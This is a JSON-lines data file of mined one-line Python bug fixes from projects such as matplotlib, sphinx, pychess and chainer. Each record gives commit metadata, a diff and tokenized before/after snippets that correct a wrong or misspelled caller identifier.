{"project": "matplotlib", "commit_sha": "e7851a41ab7b9b6b1c923e1fbc33faae51911d52", "parent_sha": "e87374e3dc121b8bf407dfba4a968c05a4c4516f", "file_path": "lib/matplotlib/nxutils.py", "project_url": "https://github.com/huayijing/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ def pnpoly(x, y, xyverts):\n-    warings.warn(\n+    warnings.warn(\n         \"nxutils is deprecated.  Use matplotlib.path.Path.contains_point\"\n         \" instead.\",\n         DeprecationWarning)\n", "before": "warings . warn ( \"nxutils is deprecated.  Use matplotlib.path.Path.contains_point\" \" instead.\" , DeprecationWarning )", "after": "warnings . warn ( \"nxutils is deprecated.  Use matplotlib.path.Path.contains_point\" \" instead.\" , DeprecationWarning )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:warings\", 0, 5, 0, 12], \"warnings\"]]"}
{"project": "matplotlib", "commit_sha": "ddb779839ee45389df015b015757fc3efe833cf0", "parent_sha": "ecdaa8ebe467af30002b58b4f7596edbd305def7", "file_path": "lib/matplotlib/patches.py", "project_url": "https://github.com/huayijing/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1049,7 +1049,7 @@ class Arrow(Patch):\n         Patch.__init__(self, **kwargs)\n-        L = ny.hypot(dx, dy)\n+        L = np.hypot(dx, dy)\n \n         if L != 0:\n             cx = float(dx) / L\n", "before": "L = ny . hypot ( dx , dy )", "after": "L = np . hypot ( dx , dy )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:ny\", 1, 13, 1, 15], \"np\"]]"}
{"project": "biopython", "commit_sha": "028450cb26970b2022035ed36892edbfb1e515c7", "parent_sha": "f32a02ef5835e4a765e230b07ea30933ebeea528", "file_path": "Scripts/xbbtools/xbb_blast.py", "project_url": "https://github.com/paulhendricks/biopython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class BlastIt:\n         self.Update()\n \n         print(self.command)\n-        self.pipe = posix.popen(self.command)\n+        self.pipe = os.popen(self.command)\n         while True:\n             try:\n                 char = self.pipe.read(1)\n", "before": "self . pipe = posix . popen ( self . command )", "after": "self . pipe = os . popen ( self . command )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:posix\", 3, 21, 3, 26], \"os\"]]"}
{"project": "letsencrypt", "commit_sha": "ab097d128b502eaa44a8d77d2ff9d5a59dcb5126", "parent_sha": "82147f1f5e3373ed9e623cbee618339ba8a3f2a6", "file_path": "letsencrypt/plugins/manual.py", "project_url": "https://github.com/Swift-2016/letsencrypt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ binary for temporary key/certificate generation.\"\"\".replace(\"\\n\", \"\")\n                     # \"preexec_fn\" is UNIX specific, but so is \"command\"\n                     preexec_fn=os.setsid)\n             except OSError as error:  # ValueError should not happen!\n-                logging.debug(\n+                logger.debug(\n                     \"Couldn't execute manual command: %s\", error, exc_info=True)\n                 return False\n             logger.debug(\"Manual command running as PID %s.\", self._httpd.pid)\n", "before": "preexec_fn = os . setsid ) except OSError as error : logging . debug ( \"Couldn't execute manual command: %s\" , error , exc_info = True )", "after": "preexec_fn = os . setsid ) except OSError as error : logger . debug ( \"Couldn't execute manual command: %s\" , error , exc_info = True )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:logging\", 3, 17, 3, 24], \"logger\"]]"}
{"project": "pychess", "commit_sha": "cbfa048f3ff2204e2cd6ed352e4338002c20a775", "parent_sha": "56f458610a64aaaab101b731688f2f72b434b800", "file_path": "sidepanel/historyPanel.py", "project_url": "https://github.com/Jnrolfe/pychess", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ class Sidepanel:\n         row, view, other = self._ply_to_row_col_other(ply)\n         \n         if conf.get(\"figuresInNotation\", False):\n-            notat = toFAN(m.getBoardAtPly(ply-1), game.getMoveAtPly(ply-1))\n+            notat = toFAN(game.getBoardAtPly(ply-1), game.getMoveAtPly(ply-1))\n         else: notat = toSAN(game.getBoardAtPly(ply-1), game.getMoveAtPly(ply-1),\n                 localRepr=True)\n         \n", "before": "notat = toFAN ( m . getBoardAtPly ( ply - 1 ) , game . getMoveAtPly ( ply - 1 ) )", "after": "notat = toFAN ( game . getBoardAtPly ( ply - 1 ) , game . getMoveAtPly ( ply - 1 ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:m\", 3, 27, 3, 28], \"game\"]]"}
{"project": "nova", "commit_sha": "d14fbc5b73b6cc358209b7d071dfe0e144c06132", "parent_sha": "5e012d8d45935b68a5ce5d50ed043d4bb8066cf8", "file_path": "nova/db/sqlalchemy/migrate_repo/versions/098_update_volume_attach_time.py", "project_url": "https://github.com/wgapl/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ def downgrade(migrate_engine):\n                 where(volumes.c.id == v['id']).\\\n                 values(attach_string=attach_time).execute()\n     except Exception:\n-        attach_datetime.drop()\n+        attach_string.drop()\n         raise\n \n     old_attachtime.alter(name='attach_time_old')\n", "before": "except Exception : attach_datetime . drop ( )", "after": "except Exception : attach_string . drop ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:attach_datetime\", 3, 9, 3, 24], \"attach_string\"]]"}
{"project": "iDK", "commit_sha": "b5ae5340088fa7c4b125163b0ef574d074b06d37", "parent_sha": "1812c3a434321e3e39d6730432815907e5f8e0e7", "file_path": "tasks/remove_dir_task.py", "project_url": "https://github.com/turekj/iDK", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,4 +11,4 @@ class RemoveDirectoryTask(core.task.Task):\n \t\tif not os.path.exists(path):\n \t\t\traise core.task.TaskGenericException('path %s does not exist' % path)\n \t\telse:\n-\t\t\toshutils.rmtree(path)\n+\t\t\tshutil.rmtree(path)\n", "before": "oshutils . rmtree ( path )", "after": "shutil . rmtree ( path )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:oshutils\", 3, 4, 3, 12], \"shutil\"]]"}
{"project": "pychess", "commit_sha": "4bd8b1471aa4f7964924dac75b22657d569e173d", "parent_sha": "3facef4fee14b3b215552aa6d42b0fcdc967ef34", "file_path": "lib/pychess/Utils/GameModel.py", "project_url": "https://github.com/Jnrolfe/pychess", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -582,7 +582,7 @@ class GameModel (GObject.GObject, Thread):\n                 if self.status in (WAITING_TO_START, PAUSED, RUNNING):\n                     stringio = StringIO()\n                     traceback.print_exc(file=stringio)\n-                    error = strinGio.getvalue()\n+                    error = stringio.getvalue()\n                     log.error(\"GameModel.run: A Player died: player=%s error=%s\\n%s\" % (curPlayer, error, e))\n                     if curColor == WHITE:\n                         self.kill(WHITE_ENGINE_DIED)\n", "before": "error = strinGio . getvalue ( )", "after": "error = stringio . getvalue ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:strinGio\", 3, 29, 3, 37], \"stringio\"]]"}
{"project": "pychess", "commit_sha": "28189bd31e03f01ef269aadcde4b9d74ab61762a", "parent_sha": "6d463072c33f54e85ec15d7ff9df50d0095fa6cf", "file_path": "lib/pychess/Utils/lutils/lmove.py", "project_url": "https://github.com/Jnrolfe/pychess", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -282,7 +282,7 @@ def parseSAN (board, san):\n     # Printing the moves seams to sometimes fuck the board up, as it applies a\n     # lot of illegal moves. At least we better make a clone.\n     board2 = LBoard()\n-    board2.applyFen (baord.asFen())\n+    board2.applyFen (board.asFen())\n     \n     errstring += \" available moves: %s\" % \" \".join(listToSan(board2, moves))\n     errstring += board.asFen()\n", "before": "board2 . applyFen ( baord . asFen ( ) )", "after": "board2 . applyFen ( board . asFen ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:baord\", 3, 22, 3, 27], \"board\"]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "3368bab00f317ad1a67733a71958802ce49676b4", "parent_sha": "54c763cd1d92e330e0d38b9a6f1bab06c2d7b605", "file_path": "chainer/functions/basic_math.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -207,7 +207,7 @@ class PowConstVar(Function):\n         return y,\n \n     def backward_cpu(self, x, gy):\n-        return math.log(self.value) * self.y * gy[0],\n+        return numpy.log(self.value) * self.y * gy[0],\n \n     def backward_gpu(self, x, gy):\n         logv = math.log(self.value)\n", "before": "return math . log ( self . value ) * self . y * gy [ 0 ] ,", "after": "return numpy . log ( self . value ) * self . y * gy [ 0 ] ,", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:math\", 3, 16, 3, 20], \"numpy\"]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "f343b3910ccd6195cc27c9f62267b1eba41ac9f6", "parent_sha": "744e7a5a67da8dec2869879f0adfae2d43eaf75c", "file_path": "cupy/cuda/device.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class Device(object):\n         dev = Device()\n         self._device_stack.append(dev)\n         if self.id != dev.id:\n-            dev.use()\n+            self.use()\n         return self\n \n     def __exit__(self, *args):\n", "before": "dev . use ( )", "after": "self . use ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:dev\", 3, 13, 3, 16], \"self\"]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "cf3864b7373291cd944ef3db5743c026dd58653e", "parent_sha": "43011789e7d553e6ed77c9afaad7bba152147bb6", "file_path": "chainer/cuda.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ def to_cpu(array, stream=None):\n \n     Args:\n-        array: Array to be sent to GPU.\n+        array: Array to be sent to CPU.\n         stream (cupy.cuda.Stream): CUDA stream.\n \n     Returns:\n", "before": "Args : array : Array to be sent to GPU . stream ( cupy . cuda . Stream ) : CUDA stream . Returns", "after": "Args : array : Array to be sent to CPU . stream ( cupy . cuda . Stream ) : CUDA stream . Returns", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:GPU\", 2, 36, 2, 39], \"CPU\"]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "a68f17f48018bf0b80fbe2f704afd5647c830543", "parent_sha": "dab286c74508d6cb21c1881c3a10d3a6b938937a", "file_path": "tests/chainer_tests/test_optimizer.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -180,7 +180,7 @@ class TestOptimizerGradientNoise(unittest.TestCase):\n         opt.add_hook(optimizer.GradientNoise(eta))\n         opt.update()\n \n-        gradient_check.assert_allclose(expect, w, rtol=0.4)\n+        testing.assert_allclose(expect, w, rtol=0.4)\n \n     def test_gradient_noise_cpu(self):\n         self.check_gradient_noise()\n", "before": "gradient_check . assert_allclose ( expect , w , rtol = 0.4 )", "after": "testing . assert_allclose ( expect , w , rtol = 0.4 )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:gradient_check\", 3, 9, 3, 23], \"testing\"]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "583d8e3caebfe682cbd2cd53dffc4629bd9fbfd5", "parent_sha": "be11d759683c465cfcc4f402d707eac03ba798e3", "file_path": "tests/chainer_tests/test_optimizer.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -180,7 +180,7 @@ class TestOptimizerGradientNoise(unittest.TestCase):\n         opt.add_hook(optimizer.GradientNoise(eta))\n         opt.update()\n \n-        gradient_check.assert_allclose(expect, w, rtol=0.4)\n+        testing.assert_allclose(expect, w, rtol=0.4)\n \n     def test_gradient_noise_cpu(self):\n         self.check_gradient_noise()\n", "before": "gradient_check . assert_allclose ( expect , w , rtol = 0.4 )", "after": "testing . assert_allclose ( expect , w , rtol = 0.4 )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:gradient_check\", 3, 9, 3, 23], \"testing\"]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "bf4e852c93bddd452eceb5f0c2a4a2091b12c59b", "parent_sha": "edd046597a24fcfed2a455bc8caf66e4d30dd55a", "file_path": "tests/chainer_tests/functions_tests/pooling_tests/test_average_pooling_nd.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class TestAveragePoolingND(unittest.TestCase):\n                 size = functools.reduce(operator.mul, ksize)\n                 expect = numpy.array([x[idx].sum() for idx in pooling_patches(\n                     dims, ksize, stride, pad)]).reshape(y_data.shape[2:])/size\n-                gradient_check.assert_allclose(\n+                testing.assert_allclose(\n                     expect, y_data[k, c], **self.check_forward_options)\n \n     @condition.retry(3)\n", "before": "gradient_check . assert_allclose ( expect , y_data [ k , c ] , ** self . check_forward_options )", "after": "testing . assert_allclose ( expect , y_data [ k , c ] , ** self . check_forward_options )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:gradient_check\", 3, 17, 3, 31], \"testing\"]]"}
{"project": "pyGameMath", "commit_sha": "bc0acd8e4bdfce2a202d37cf18adc4d16023f27e", "parent_sha": "dd93f3e88a9dcc54aacd27bdd1a3597e1684e69b", "file_path": "src/common.py", "project_url": "https://github.com/explosiveduck/pyGameMath", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ def scalarLerp(a, b, time):\n # Returns the view port coordinates\n def getViewPort(coords, width, height):\n     ''' A version of glViewPort except it returns the coords. '''\n-    coordsN = cords.normalize()\n+    coordsN = coords.normalize()\n     x = (coordsN[0] + 1) * (width / 2) + coords[0]\n     y = (coordsN[1] + 1) * (height / 2) + coords[1]\n     return [x,y,width,height]\n", "before": "coordsN = cords . normalize ( )", "after": "coordsN = coords . normalize ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:cords\", 3, 15, 3, 20], \"coords\"]]"}
{"project": "toaster-next", "commit_sha": "92518c5017945d29099b029a7c2bf80261287d6e", "parent_sha": "dfc13c9ae719ccbcf048c1d5e7cdb7bd6978137d", "file_path": "bitbake/lib/bb/fetch2/git.py", "project_url": "https://github.com/toastertester/toaster-next", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -280,7 +280,7 @@ class Git(FetchMethod):\n         # Check if we have the rev already\n \n         if not os.path.exists(ud.clonedir):\n-            logging.debug(\"GIT repository for %s does not exist in %s.  \\\n+            logger.debug(\"GIT repository for %s does not exist in %s.  \\\n                           Downloading.\", url, ud.clonedir)\n             self.download(None, ud, d)\n             if not os.path.exists(ud.clonedir):\n", "before": "logging . debug ( \"GIT repository for %s does not exist in %s.  \\\n                           Downloading.\" , url , ud . clonedir )", "after": "logger . debug ( \"GIT repository for %s does not exist in %s.  \\\n                           Downloading.\" , url , ud . clonedir )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:logging\", 3, 13, 3, 20], \"logger\"]]"}
{"project": "someip-scapy-integration", "commit_sha": "94dce6df3f140a191c5880f25abd56299ba37b44", "parent_sha": "6aaf9ef98424a713b3c21e9f32a31a1358e1d6c8", "file_path": "scapy/contrib/openflow3.py", "project_url": "https://github.com/baarse/someip-scapy-integration", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2595,7 +2595,7 @@ class GroupDescPacketListField(PacketListField):\n         remain = s\n \n         while remain:\n-            l = GroupsDescPacketListField._get_group_desc_length(remain)\n+            l = GroupDescPacketListField._get_group_desc_length(remain)\n             current = remain[:l]\n             remain = remain[l:]\n             p = OFPGroupDesc(current)\n", "before": "l = GroupsDescPacketListField . _get_group_desc_length ( remain )", "after": "l = GroupDescPacketListField . _get_group_desc_length ( remain )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:GroupsDescPacketListField\", 3, 17, 3, 42], \"GroupDescPacketListField\"]]"}
{"project": "pysport", "commit_sha": "cf3049870a911a458692aa647e7da745524aa548", "parent_sha": "f61c936ead940251a0ef2c518a12676a6159cffd", "file_path": "sportorg/models/memory.py", "project_url": "https://github.com/sportorg/pysport", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1768,7 +1768,7 @@ class RelayTeam(object):\n         self.place = 0\n \n     def __eq__(self, other):\n-        if self.get_is_status_ok() == self.get_is_status_ok():\n+        if self.get_is_status_ok() == other.get_is_status_ok():\n             if self.get_correct_lap_count() == other.get_correct_lap_count():\n                 if self.get_time() == other.get_time():\n                     return True\n", "before": "if self . get_is_status_ok ( ) == self . get_is_status_ok ( ) : if self . get_correct_lap_count ( ) == other . get_correct_lap_count ( ) : if self . get_time ( ) == other . get_time ( ) : return True", "after": "if self . get_is_status_ok ( ) == other . get_is_status_ok ( ) : if self . get_correct_lap_count ( ) == other . get_correct_lap_count ( ) : if self . get_time ( ) == other . get_time ( ) : return True", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 39, 3, 43], \"other\"]]"}
{"project": "skypebot", "commit_sha": "c24c51fbc449cab6ce0427370b76c6d4d3034ad5", "parent_sha": "d0e1b0788abdf08c214a39f10744fdc506690430", "file_path": "skypebot.py", "project_url": "https://github.com/poietic/skypebot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ class BotThread( queuedthread.QueuedThread ):\n         command_mappings[ \"rumble\"] = rumblecommand.RumbleCommand()\n         command_mappings[ \"prezi\"] = prezicommand.PreziCommand()\n         command_mappings[ \"fractal\"] = prezicommand.FractalCommand()\n-        command_mappings[ \"knockknock\"] = scratchcommand.KnockKnockCommand()\n+        command_mappings[ \"knockknock\"] = commandscratch.KnockKnockCommand()\n \n         if RUN_SKYPE:\n             logging.info( \"Attaching to Skype...\" )\n", "before": "command_mappings [ \"knockknock\" ] = scratchcommand . KnockKnockCommand ( )", "after": "command_mappings [ \"knockknock\" ] = commandscratch . KnockKnockCommand ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:scratchcommand\", 3, 43, 3, 57], \"commandscratch\"]]"}
{"project": "sigmacms-polymorphic-tree", "commit_sha": "ced52aa8baeea065d62f239cdff6bef128e817c6", "parent_sha": "25409416270c8ccae1e1f071c74f36c9d2fe743f", "file_path": "polymorphic_tree/managers.py", "project_url": "https://github.com/bashu/sigmacms-polymorphic-tree", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,4 +31,4 @@ class PolymorphicMPTTModelManager(TreeManager, PolymorphicManager):\n         # By using .all(), the proper get_query_set()/get_queryset() will be used for each Django version.\n         # Django 1.4/1.5 need to use get_query_set(), because the RelatedManager overrides that.\n-        return qs.all().toplevel()\n+        return self.all().toplevel()\n", "before": "return qs . all ( ) . toplevel ( )", "after": "return self . all ( ) . toplevel ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:qs\", 2, 16, 2, 18], \"self\"]]"}
{"project": "django-tastypie", "commit_sha": "691b62730d3c0f2a9553b0ba3176cb145823f5bd", "parent_sha": "4a5367946e6d95099045287cae952af31f7d5acc", "file_path": "tests/basic/tests/http.py", "project_url": "https://github.com/yveson33/django-tastypie", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class HTTPTestCase(TestServerTestCase):\n         self.assertEqual(response.status, 200)\n \n         data = response.read()\n-        obj = simplejson.loads(data)\n+        obj = json.loads(data)\n \n         self.assertEqual(obj['content'], 'A new post.')\n         self.assertEqual(obj['is_active'], True)\n", "before": "obj = simplejson . loads ( data )", "after": "obj = json . loads ( data )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:simplejson\", 3, 15, 3, 25], \"json\"]]"}
{"project": "gnu_dnt", "commit_sha": "33134ecb055d2f1b88d1194bf812caa0c86b2e60", "parent_sha": "4c7e2b99dfd69ee4690d33fe34b438774195e608", "file_path": "src/Exceptions.py", "project_url": "https://github.com/gitGNU/gnu_dnt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -296,7 +296,7 @@ class EExpression(EBase) :\n \n class InvalidExpression(EExpression) :\n     def __init__(self, message) :\n-        EEnum.__init__(self, \"invalid `\" + message + \"' expression\")\n+        EExpression.__init__(self, \"invalid `\" + message + \"' expression\")\n \n # Test\n if (__name__ == '__main__') :\n", "before": "EEnum . __init__ ( self , \"invalid `\" + message + \"' expression\" )", "after": "EExpression . __init__ ( self , \"invalid `\" + message + \"' expression\" )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:EEnum\", 3, 9, 3, 14], \"EExpression\"]]"}
{"project": "mosaic", "commit_sha": "50bb2db16648fd3cab729be0b4c9b269d037761e", "parent_sha": "b1faa014bb4024eef198c1fcf550e80e7be00094", "file_path": "master.py", "project_url": "https://github.com/KeithWM/mosaic", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ def process(pars):\n     strrep = '_'.join(['{}{:d}'.format(item, value) for item, value in sorted(pars.items())])+'.png'\n     FinalImg.save('output/final'+strrep)\n     print \"M{}: Final image saved\".format(rank)\n-    sys.copy('log', 'output/log_'+strrep)\n+    shutil.copy('log', 'output/log_'+strrep)\n \n #%% signal completion\n     comm.barrier()\n", "before": "sys . copy ( 'log' , 'output/log_' + strrep )", "after": "shutil . copy ( 'log' , 'output/log_' + strrep )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:sys\", 3, 5, 3, 8], \"shutil\"]]"}
{"project": "instabot.py", "commit_sha": "ad8b39d2219720510839364eed2a65ee4a02f11d", "parent_sha": "5eaacfaac866c35e766206a2f8a483f1e7eb68b6", "file_path": "src/instabot.py", "project_url": "https://github.com/iiOne/instabot.py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -338,7 +338,7 @@ class InstaBot:\n                             try:\n                                 caption = self.media_by_tag[i]['caption'].encode('ascii',errors='ignore')\n                                 tag_blacklist = set(self.tag_blacklist)\n-                                tags = {str.lower((tag.decode('ASCII')).strip('#')) for tag in caption.split() if\n+                                tags = {unicode.lower((tag.decode('ASCII')).strip('#')) for tag in caption.split() if\n                                         (tag.decode('ASCII')).startswith(\"#\")}\n                                 if tags.intersection(tag_blacklist):\n                                         matching_tags = ', '.join(tags.intersection(tag_blacklist))\n", "before": "tags = { str . lower ( ( tag . decode ( 'ASCII' ) ) . strip ( '#' ) ) for tag in caption . split ( ) if ( tag . decode ( 'ASCII' ) ) . startswith ( \"#\" ) }", "after": "tags = { unicode . lower ( ( tag . decode ( 'ASCII' ) ) . strip ( '#' ) ) for tag in caption . split ( ) if ( tag . decode ( 'ASCII' ) ) . startswith ( \"#\" ) }", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:str\", 3, 41, 3, 44], \"unicode\"]]"}
{"project": "LMR", "commit_sha": "d3dbd2a32185d10ce363da10e59dd686161f0993", "parent_sha": "66086f6e6cf6fda1906cb3d3270867244672e19e", "file_path": "LMR_config_template.py", "project_url": "https://github.com/modons/LMR", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1606,7 +1606,7 @@ class prior(ConfigGroup):\n         elif self.regrid_method == 'esmpy':\n             self.regrid_resolution = None\n             self.esmpy_interp_method = self.esmpy_interp_method\n-            self.esmpy_grid_def = _GridDefinitions.get_info(self.esmpy_regrid_to)\n+            self.esmpy_grid_def = _GridDef.get_info(self.esmpy_regrid_to)\n         else:\n             self.regrid_resolution = None\n \n", "before": "self . esmpy_grid_def = _GridDefinitions . get_info ( self . esmpy_regrid_to )", "after": "self . esmpy_grid_def = _GridDef . get_info ( self . esmpy_regrid_to )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:_GridDefinitions\", 3, 35, 3, 51], \"_GridDef\"]]"}
{"project": "b2share", "commit_sha": "eb0ddcdf59de978ea81136f3b722885501ebaf68", "parent_sha": "eac2b3ce46cd0d1ba4ae37f60f59ac676ca6a454", "file_path": "modules/miscutil/lib/plotextractor_getter.py", "project_url": "https://github.com/nharraud/b2share", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -262,7 +262,7 @@ def tarballs_by_recids(recids, sdir, docname=None, doctype=None, docformat=None)\n \n     else:\n         if '-' in recids:\n-            low, high = recid.split('-')\n+            low, high = recids.split('-')\n             list_of_ids = range(int(low), int(high))\n         else:\n", "before": "else : if '-' in recids : low , high = recid . split ( '-' )", "after": "else : if '-' in recids : low , high = recids . split ( '-' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:recid\", 3, 25, 3, 30], \"recids\"]]"}
{"project": "registration", "commit_sha": "6ee97a021c3ad98f6c7edf437b52cfed60ca8859", "parent_sha": "446c7ff8c736710149b0da7a0f9287f7a86a134a", "file_path": "usermsg.py", "project_url": "https://github.com/fdotta/registration", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ def mtimeT(t0, i, fname):\n     print \"       time: %5.2f  [%s T try %1i]\" % (time.time() - t0, os.path.split(fname)[1],i)\n \n def mfailimg(t0, fname):\n-    print \"       time: %5.2f [%s fail]\" % (tim.time() - t0, os.path.split(fname)[1])\n+    print \"       time: %5.2f [%s fail]\" % (time.time() - t0, os.path.split(fname)[1])\n \n def mdoneimg(t0, fname):\n     print \"       time: %5.2f [warp %s]\" % (time.time() - t0, os.path.split(fname)[1])\n", "before": "print \"       time: %5.2f [%s fail]\" % ( tim . time ( ) - t0 , os . path . split ( fname ) [ 1 ] )", "after": "print \"       time: %5.2f [%s fail]\" % ( time . time ( ) - t0 , os . path . split ( fname ) [ 1 ] )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:tim\", 3, 45, 3, 48], \"time\"]]"}
{"project": "sphinx", "commit_sha": "80c3d9c848007add749ca34f2702d14a85a7da03", "parent_sha": "cbd1d345b01cc0cbd3213ed349349a80aac720fa", "file_path": "sphinx/ext/autosummary/__init__.py", "project_url": "https://github.com/jarrodmillman/sphinx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -608,8 +608,8 @@ def process_generate_options(app):\n \n     suffix = get_rst_suffix(app)\n     if suffix is None:\n-        logging.warning('autosummary generats .rst files internally. '\n-                        'But your source_suffix does not contain .rst. Skipped.')\n+        logger.warning('autosummary generats .rst files internally. '\n+                       'But your source_suffix does not contain .rst. Skipped.')\n         return\n \n     generate_autosummary_docs(genfiles, builder=app.builder,\n", "before": "logging . warning ( 'autosummary generats .rst files internally. ' 'But your source_suffix does not contain .rst. Skipped.' )", "after": "logger . warning ( 'autosummary generats .rst files internally. ' 'But your source_suffix does not contain .rst. Skipped.' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:logging\", 3, 9, 3, 16], \"logger\"]]"}
{"project": "sphinx", "commit_sha": "30a10d3e296376a1b71b121df7ec85ad45f8c5aa", "parent_sha": "fb48f5a9210455f9361921be013eddb2ca8ebe51", "file_path": "sphinx/builders/gettext.py", "project_url": "https://github.com/jarrodmillman/sphinx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -197,7 +197,7 @@ def should_write(filepath, new_content):\n     with open(filepath, 'r', encoding='utf-8') as oldpot:  # type: ignore\n         old_content = oldpot.read()\n         old_header_index = old_content.index('\"POT-Creation-Date:')\n-        new_header_index = old_content.index('\"POT-Creation-Date:')\n+        new_header_index = new_content.index('\"POT-Creation-Date:')\n         old_body_index = old_content.index('\"PO-Revision-Date:')\n         new_body_index = new_content.index('\"PO-Revision-Date:')\n         return ((old_content[:old_header_index] != new_content[:new_header_index]) or\n", "before": "new_header_index = old_content . index ( '\"POT-Creation-Date:' )", "after": "new_header_index = new_content . index ( '\"POT-Creation-Date:' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:old_content\", 3, 28, 3, 39], \"new_content\"]]"}
